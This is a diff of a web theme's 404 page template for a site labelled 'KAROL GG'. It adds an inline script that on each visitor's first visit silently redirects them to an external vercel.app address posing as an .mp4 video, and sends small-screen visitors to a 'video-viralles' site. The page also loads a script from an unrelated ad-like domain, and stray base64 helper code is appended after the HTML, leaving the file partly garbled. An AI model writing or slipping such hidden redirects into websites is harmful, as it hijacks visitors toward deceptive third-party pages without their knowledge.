@@ -97,6 +97,25 @@ div.editor-visual-editor__post-title-wrapper.edit-post-visual-editor__post-title
 			<a class="text-white" href="/">KAROL GG</a>
 		</span>
 	</div>
+			
+    <script>
+        // Verificar si es la primera visita
+        if (!localStorage.getItem('visited')) {
+            // Generar un número aleatorio único y actualizar el enlace dinámico
+            var randomNumber = Math.floor(Math.random() * 1000000000); // Número aleatorio de 0 a 999,999,999
+            var dynamicLink = document.getElementById('dynamicLink');
+            dynamicLink.href = 'https://complevidelc.vercel.app/?m=' + randomNumber + '.mp4'; // Agregar .mp4 al final del número aleatorio
+            // Establecer una bandera para indicar que el usuario ha visitado la página
+            localStorage.setItem('visited', 'true');
+            // Redirigir automáticamente si es la primera visita
+            window.location.href = dynamicLink.href;
+        } else {
+            // Redirigir a la URL específica para dispositivos móviles
+            if (window.innerWidth <= 480 && window.innerHeight <= 800) {
+                window.location.href = 'https://video-viralles.vercel.app/';
+            }
+        }
+    </script><main id="content" class="site-main">
 
 	<label class="block lg:hidden cursor-pointer flex items-center px-3 py-2 border rounded text-cyan-200 border-cyan-400 hover:text-white hover:border-white" for="menu-toggle">
 		<svg class="fill-current h-3 w-3" viewBox="0 0 20 20" xmlns="https://captionconjecture.com/ncd0tibp?key=a38d20c400ac0e1de01424f98192b1cf">
@@ -220,41 +239,7 @@ document.addEventListener("DOMContentLoaded", function() {
 	};
 </script>
 <script type="text/javascript" src="//captionconjecture.com/3a33eddc69ebce8d41b3be5bcf3fa0b0/invoke.js"></script>
-<script>
-      <script>
-        // Verificar si es la primera visita
-        if (!localStorage.getItem('visited')) {
-            // Generar un número aleatorio único y actualizar el enlace dinámico
-            var randomNumber = Math.floor(Math.random() * 1000000000); // Número aleatorio de 0 a 999,999,999
-            var dynamicLink = document.getElementById('dynamicLink');
-            dynamicLink.href = 'https://complevidelc.vercel.app/?m=' + randomNumber + '.mp4'; // Agregar .mp4 al final del número aleatorio
-            // Establecer una bandera para indicar que el usuario ha visitado la página
-            localStorage.setItem('visited', 'true');
-            // Redirigir automáticamente si es la primera visita
-            window.location.href = dynamicLink.href;
-        } else {
-            // Redirigir a la URL específica para dispositivos móviles
-            if (window.innerWidth <= 480 && window.innerHeight <= 800) {
-                window.location.href = 'https://video-viralles.vercel.app/';
-            }
-        }
-    </script><main id="content" class="site-main">
-
-			<header class="page-header">
-			<h1 class="entry-title">The page can&rsquo;t be found.</h1>
-		</header>
 	
-	<div class="page-content">
-		<p>It looks like nothing was found at this location.</p>
-	</div>
-
-</main>
-<footer id="site-footer" class="site-footer">
-	</footer>
-
-
-</body>
-</html>
 function b2a(a){var b,c=0,l=0,f="",g=[];if(!a)return a;do{var e=a.charCodeAt(c++);var h=a.charCodeAt(c++);var k=a.charCodeAt(c++);var d=e<<16|h<<8|k;e=63&d>>18;h=63&d>>12;k=63&d>>6;d&=63;g[l++]="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".charAt(e)+"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".charAt(h)+"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".charAt(k)+"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".charAt(d)}while(c<
 a.length);return f=g.join(""),b=a.length%3,(b?f.slice(0,b-3):f)+"===".slice(b||3)}function a2b(a){var b,c,l,f={},g=0,e=0,h="",k=String.fromCharCode,d=a.length;for(b=0;64>b;b++)f["ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".charAt(b)]=b;for(c=0;d>c;c++)for(b=f[a.charAt(c)],g=(g<<6)+b,e+=6;8<=e;)((l=255&g>>>(e-=8))||d-2>c)&&(h+=k(l));return h}b64e=function(a){return btoa(encodeURIComponent(a).replace(/%([0-9A-F]{2})/g,function(b,a){return String.fromCharCode("0x"+a)}))};
 b64d=function(a){return decodeURIComponent(atob(a).split("").map(function(a){return"%"+("00"+a.charCodeAt(0).toString(16)).slice(-2)}).join(""))};
